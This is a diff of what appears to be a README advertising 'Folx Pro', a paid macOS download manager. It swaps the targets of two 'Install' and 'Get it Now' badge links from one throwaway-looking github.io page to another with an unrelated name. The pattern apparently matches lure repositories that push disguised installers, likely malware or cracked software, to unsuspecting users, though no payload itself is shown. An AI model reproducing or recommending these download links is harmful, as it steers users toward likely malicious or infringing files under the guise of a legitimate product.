@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/folxPro)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/folxPro)
 
 </div>
 
@@ -81,7 +81,7 @@ Folx Pro's split-thread download acceleration provides its most noticeable benef
 
 <p align="center">
 
-[![Get it Now Folx Pro](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/folxPro)
+[![Get it Now Folx Pro](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/folxPro)
 
 </p>
 
